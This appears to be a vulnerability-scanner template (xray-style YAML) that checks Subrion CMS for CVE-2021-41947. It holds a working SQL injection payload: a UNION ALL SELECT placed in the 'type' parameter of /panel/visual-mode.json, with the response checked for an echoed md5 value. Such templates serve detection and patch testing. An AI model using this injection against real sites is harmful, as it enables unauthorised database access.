name: poc-yaml-subrioncms-cve-2021-41947-sqli
binding: d3cd1956-815e-42ee-86dd-1ab73ecd22a8
manual: true
detail:
    author: 东晓南
    links:
        - https://github.com/intelliants/subrion/issues/887
        - https://nvd.nist.gov/vuln/detail/CVE-2021-41947
    vulnerability:
        id: CT-178371
        level: high
    check_action: 需要认证登陆
transport: http
set:
    s1: randomInt(100000, 200000)
    s2: randomInt(100000, 200000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /panel/visual-mode.json?get=access&type=blocks%27%20UNION%20ALL%20SELECT%20md5({{s1}}),{{s2}}%20--%20-&object=landing_what_is_this&page=index
            follow_redirects: true
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0()
